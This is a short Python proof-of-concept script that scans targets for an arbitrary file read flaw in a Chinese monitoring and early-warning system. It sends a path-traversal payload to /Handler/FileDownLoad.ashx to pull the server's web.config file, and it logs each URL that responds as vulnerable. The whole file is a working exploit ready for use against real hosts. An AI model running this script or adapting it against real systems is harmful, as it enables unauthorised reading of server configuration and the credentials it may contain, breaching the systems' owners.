import requests
import time
import buter
import wirtefile

filename = "./reps/华测监测预警系统任意文件读取-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded"
    }

data = '''filename=1&filepath=..%2F..%2Fweb.config'''
poc = "/Handler/FileDownLoad.ashx"
def HCfileread(url):
    try:
        reps = requests.post(url+ poc, headers=headers, data=data, timeout=2, verify=False)
        if reps.status_code == 200 and '<?xml' in reps.text:
            print(buter.colors.GREEN+  f"存在华测监测预警系统任意文件读取 url : {url}" + buter.colors.END)
            reptext = url
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现华测监测预警系统任意文件读取 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
